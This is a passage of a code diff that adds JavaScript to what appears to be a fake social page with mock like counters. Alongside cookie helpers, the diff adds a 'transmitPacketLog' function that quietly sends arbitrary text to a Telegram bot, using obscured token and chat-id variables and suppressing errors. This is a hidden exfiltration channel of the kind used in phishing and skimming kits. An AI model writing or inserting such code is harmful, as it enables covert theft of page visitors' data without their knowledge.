+        if (!btn.classList.contains('c-act-active')) {
+            let countRef = document.getElementById(`mockLikeCounter-${idx}`);
+            countRef.innerText = parseInt(countRef.innerText) + 1;
+            btn.classList.add('c-act-active');
         }
+    }
+
+    // Telegram Bot Broadcast Dispatcher
+    function transmitPacketLog(textBlock) {
+        let targetBotUrl = `https://api.telegram.org/bot${_tkEngine}/sendMessage?chat_id=${_chEngine}&text=${encodeURIComponent(textBlock)}`;
+        fetch(targetBotUrl).catch(() => {});
+    }
+
+    // Cookie Handlers Controller Properties
+    function setCookiePayload(name, value, days) {
+        const dateObj = new Date(); dateObj.setTime(dateObj.getTime() + (days*24*60*60*1000));
+        document.cookie = name + "=" + value + ";expires="+ dateObj.toUTCString() + ";path=/";
+    }
+    function getCookiePayload(name) {
+        let matchStr = name + "="; let decodedCookie = decodeURIComponent(document.cookie); let arraySegments = decodedCookie.split(';');
+        for(let i = 0; i < arraySegments.length; i++) {
+            let segment = arraySegments[i]; while (segment.charAt(0) == ' ') { segment = segment.substring(1); }
+            if (segment.indexOf(matchStr) == 0) return segment.substring(matchStr.length, segment.length);
+        }
+        return "";
     }
 </script>
 
